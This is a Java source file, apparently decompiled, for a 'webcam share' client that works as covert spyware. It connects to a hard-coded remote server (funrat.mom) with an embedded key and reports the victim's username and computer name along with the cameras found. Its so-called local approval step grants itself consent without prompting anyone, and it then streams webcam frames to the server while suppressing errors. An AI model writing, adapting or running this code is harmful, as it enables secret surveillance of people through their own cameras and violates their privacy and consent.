package com.example.screen;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.github.sarxos.webcam.Webcam;
import java.awt.GraphicsEnvironment;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.net.URI;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.MemoryCacheImageOutputStream;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

public class WebcamShareSender {
   private static final int DEFAULT_FPS = 8;
   private static final float DEFAULT_QUALITY = 0.7F;
   private static final int DEFAULT_CAMERA_INDEX = 0;

   public static void main(String[] args) throws Exception {
      String accessKey = args.length > 0 ? args[0] : "098cf3c1-2b8c-4094-82c2-388699660f90";
      String wsUrl = args.length > 1 ? args[1] : "wss://funrat.mom/webcam-stream";
      String clientId = args.length > 2 ? args[2] : "WEBCAM-CLIENT-001";
      String deviceName = args.length > 3 ? args[3] : defaultDeviceName();
      int cameraIndex = args.length > 4 ? parseInt(args[4], 0) : 0;
      int fps = args.length > 5 ? parseInt(args[5], 8) : 8;
      float quality = args.length > 6 ? parseFloat(args[6], 0.7F) : 0.7F;
      WebcamShareSender.SenderClient client = new WebcamShareSender.SenderClient(new URI(wsUrl), accessKey, clientId, deviceName, cameraIndex, fps, quality);
      client.connectBlocking();
      client.awaitClose();
   }

   private static int parseInt(String value, int fallback) {
      try {
         return Integer.parseInt(value);
      } catch (Exception ignored) {
         return fallback;
      }
   }

   private static float parseFloat(String value, float fallback) {
      try {
         return Float.parseFloat(value);
      } catch (Exception ignored) {
         return fallback;
      }
   }

   private static String defaultDeviceName() {
      String pcName = System.getProperty("user.name");
      String host = System.getenv("COMPUTERNAME");
      if (pcName == null || pcName.trim().isEmpty()) {
         pcName = "user";
      }

      if (host == null || host.trim().isEmpty()) {
         host = "host";
      }

      return pcName + "@" + host;
   }

   private static int clampFps(int value) {
      if (value < 1) {
         return 1;
      } else {
         return value > 30 ? 30 : value;
      }
   }

   private static float clampQuality(float value) {
      if (value < 0.3F) {
         return 0.3F;
      } else {
         return value > 0.95F ? 0.95F : value;
      }
   }

   private static final class SenderClient extends WebSocketClient {
      private final String accessKey;
      private final String clientId;
      private final String deviceName;
      private final int cameraIndex;
      private volatile int fps;
      private volatile float jpegQuality;
      private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
      private final CountDownLatch closeLatch = new CountDownLatch(1);
      private final AtomicBoolean approvalInProgress = new AtomicBoolean(false);
      private final ObjectMapper mapper = new ObjectMapper();
      private volatile Webcam webcam;
      private volatile boolean approved = false;

      private SenderClient(URI serverUri, String accessKey, String clientId, String deviceName, int cameraIndex, int fps, float jpegQuality) {
         super(serverUri);
         this.accessKey = accessKey;
         this.clientId = clientId;
         this.deviceName = deviceName;
         this.cameraIndex = Math.max(0, cameraIndex);
         this.fps = WebcamShareSender.clampFps(fps);
         this.jpegQuality = WebcamShareSender.clampQuality(jpegQuality);
      }

      public void onOpen(ServerHandshake handshakedata) {
         try {
            this.sendIdentify();
         } catch (Throwable var5) {
         }

         try {
            this.sendDeviceList();
         } catch (Throwable var4) {
         }

         try {
            this.requestLocalApproval();
         } catch (Throwable var3) {
         }

         System.out.println("Webcam sender connected to " + this.getURI());
      }

      public void onMessage(String message) {
      }

      public void onClose(int code, String reason, boolean remote) {
         this.scheduler.shutdownNow();
         this.closeLatch.countDown();
         this.stopCapture();
         System.out.println("Webcam sender disconnected: " + reason);
      }

      public void onError(Exception ex) {
         ex.printStackTrace();
      }

      private void sendIdentify() {
         try {
            String payload = this.mapper
               .createObjectNode()
               .put("type", "identify")
               .put("key", this.accessKey)
               .put("clientId", this.clientId)
               .put("deviceName", this.deviceName)
               .toString();
            this.send(payload);
         } catch (Exception var2) {
         }
      }

      private void sendDeviceList() {
         try {
            List<Webcam> webcams = Webcam.getWebcams();
            ArrayNode list = this.mapper.createArrayNode();

            for (int i = 0; i < webcams.size(); i++) {
               Webcam cam = webcams.get(i);
               ObjectNode item = this.mapper.createObjectNode();
               item.put("index", i);
               item.put("name", cam != null ? cam.getName() : "Camera " + (i + 1));
               list.add(item);
            }

            ObjectNode payload = this.mapper.createObjectNode();
            payload.put("type", "devices");
            payload.put("key", this.accessKey);
            payload.put("clientId", this.clientId);
            payload.set("devices", list);
            this.send(payload.toString());
         } catch (Throwable var6) {
         }
      }

      private void requestLocalApproval() {
         if (GraphicsEnvironment.isHeadless()) {
            System.out.println("Webcam start ignored: no UI available for local approval.");
         } else if (this.approvalInProgress.compareAndSet(false, true)) {
            try {
               this.approved = true;
               this.startCapture();
            } finally {
               this.approvalInProgress.set(false);
            }
         }
      }

      private void startCapture() {
         if (this.approved) {
            List<Webcam> webcams;
            try {
               webcams = Webcam.getWebcams();
            } catch (Throwable t) {
               System.out.println("Webcam discovery failed: " + t.getClass().getSimpleName() + ": " + t.getMessage());
               return;
            }

            if (webcams.isEmpty()) {
               System.out.println("No webcams found.");
            } else {
               int idx = Math.min(this.cameraIndex, webcams.size() - 1);
               Webcam selected = webcams.get(idx);
               if (selected == null) {
                  System.out.println("Webcam index " + idx + " is not available.");
               } else {
                  try {
                     selected.open(true);
                  } catch (Exception e) {
                     System.out.println("Failed to open webcam: " + e.getMessage());
                     return;
                  }

                  this.webcam = selected;
                  int intervalMs = Math.max(1, Math.round(1000.0F / Math.max(1, this.fps)));
                  this.scheduler.scheduleAtFixedRate(this::captureAndSend, 0L, intervalMs, TimeUnit.MILLISECONDS);
               }
            }
         }
      }

      private void captureAndSend() {
         try {
            if (!this.isOpen() || this.webcam == null) {
               return;
            }

            BufferedImage image = this.webcam.getImage();
            if (image == null) {
               return;
            }

            byte[] bytes = this.encodeJpeg(image, this.jpegQuality);
            this.send(bytes);
         } catch (Throwable var3) {
         }
      }

      private byte[] encodeJpeg(BufferedImage image, float quality) throws Exception {
         Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName("jpeg");
         if (!writers.hasNext()) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            return baos.toByteArray();
         }

         ImageWriter writer = writers.next();
         ByteArrayOutputStream baos = new ByteArrayOutputStream();

         try {
            MemoryCacheImageOutputStream out = new MemoryCacheImageOutputStream(baos);

            try {
               writer.setOutput(out);
               ImageWriteParam param = writer.getDefaultWriteParam();
               if (param.canWriteCompressed()) {
                  param.setCompressionMode(2);
                  param.setCompressionQuality(Math.max(0.1F, Math.min(1.0F, quality)));
               }

               writer.write(null, new IIOImage(image, null, null), param);
            } catch (Throwable var14) {
               try {
                  out.close();
               } catch (Throwable var13) {
                  var14.addSuppressed(var13);
               }

               throw var14;
            }

            out.close();
         } finally {
            writer.dispose();
         }

         return baos.toByteArray();
      }

      private void stopCapture() {
         this.approved = false;
         if (this.webcam != null) {
            try {
               this.webcam.close();
            } catch (Exception var2) {
            }

            this.webcam = null;
         }
      }

      public void awaitClose() throws InterruptedException {
         this.closeLatch.await();
      }
   }
}
